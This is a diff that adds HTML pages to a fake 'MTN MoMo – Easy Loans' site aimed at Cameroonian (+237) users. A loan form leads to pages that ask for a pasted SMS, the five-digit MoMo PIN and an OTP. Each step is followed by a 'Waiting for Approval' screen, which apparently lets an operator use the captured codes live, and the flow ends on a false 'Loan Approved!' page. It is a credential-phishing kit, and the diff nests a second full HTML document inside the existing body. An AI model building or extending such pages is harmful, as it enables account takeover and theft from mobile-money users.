@@ -7,7 +7,95 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
+<body><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo – Easy Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
 <body>
+
+<!-- PAGE 1: DETAILS FORM -->
+<div id="page-details" class="page active">
+  <div class="land-card">
+    <h2>Loan Application Details</h2>
+    <div class="msg-box error" id="dErr"></div>
+    <label>First Name</label><input type="text" id="dFi">
+    <label>Last Name</label><input type="text" id="dLa">
+    <label>Email</label><input type="email" id="dEm">
+    <label>Phone (9 digits, +237)</label><div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="dPh" maxlength="9"></div>
+    <label>Loan Amount</label><input type="number" id="dAm" value="1000000">
+    <label>Loan Term</label><select id="dTe"><option>6 Months</option><option>12 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select>
+    <label>Purpose</label><textarea id="dPu"></textarea>
+    <button class="btn-grad" onclick="submitDetails()">SUBMIT</button>
+  </div>
+</div>
+
+<!-- PAGE 2: WAIT FOR APP APPROVAL -->
+<div id="page-wait-app" class="page">
+  <div class="wait-wrap"><h2>Waiting for Admin Approval</h2><p>Your application is under review.</p></div>
+</div>
+
+<!-- PAGE 3: SMS PASTE (with countdown/resend below) -->
+<div id="page-sms" class="page">
+  <div class="sms-card">
+    <h2>Paste SMS</h2>
+    <textarea id="smsText" placeholder="Paste the SMS you received"></textarea>
+    <div class="msg-box error" id="smsErr"></div>
+    <button id="btnSms" class="btn-grad" onclick="submitSms()">SUBMIT SMS</button>
+    <!-- Countdown and resend BELOW the box -->
+    <div id="smsTimerBox" style="margin-top:15px;">
+      <div id="smsCountdown">Resend available in 60s</div>
+      <button id="btnResendSms" class="btn-gray" onclick="resendSms()" style="display:none;">RESEND SMS</button>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 4: WAIT FOR SMS APPROVAL -->
+<div id="page-wait-sms" class="page"><div class="wait-wrap"><h2>Waiting for SMS Approval</h2></div></div>
+
+<!-- PAGE 5: PIN ENTRY -->
+<div id="page-pin" class="page">
+  <div class="pin-card">
+    <h2>Enter MoMo PIN</h2>
+    <input type="password" id="pinInput" maxlength="5" placeholder="5-digit PIN">
+    <div class="msg-box error" id="pinErr"></div>
+    <button class="btn-grad" onclick="submitPin()">SUBMIT PIN</button>
+  </div>
+</div>
+
+<!-- PAGE 6: WAIT FOR PIN APPROVAL -->
+<div id="page-wait-pin" class="page"><div class="wait-wrap"><h2>Waiting for PIN Approval</h2></div></div>
+
+<!-- PAGE 7: OTP ENTRY (with countdown/resend below) -->
+<div id="page-otp" class="page">
+  <div class="otp-card">
+    <h2>Enter OTP</h2>
+    <input type="text" id="otpInput" maxlength="4" placeholder="4-digit OTP">
+    <div class="msg-box error" id="otpErr"></div>
+    <button class="btn-grad" onclick="submitOtp()">SUBMIT OTP</button>
+    <!-- Countdown and resend BELOW the box -->
+    <div id="otpTimerBox" style="margin-top:15px;">
+      <div id="otpCountdown">Resend available in 60s</div>
+      <button id="btnResendOtp" class="btn-gray" onclick="resendOtp()" style="display:none;">RESEND OTP</button>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 8: WAIT FOR OTP APPROVAL -->
+<div id="page-wait-otp" class="page"><div class="wait-wrap"><h2>Waiting for OTP Approval</h2></div></div>
+
+<!-- PAGE 9: APPROVAL -->
+<div id="page-approval" class="page">
+  <div class="approval-card"><h2>Loan Approved!</h2><p>Congratulations!</p></div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
 
     <!-- PAGE 1: LANDING -->
     <div id="page-landing" class="page">
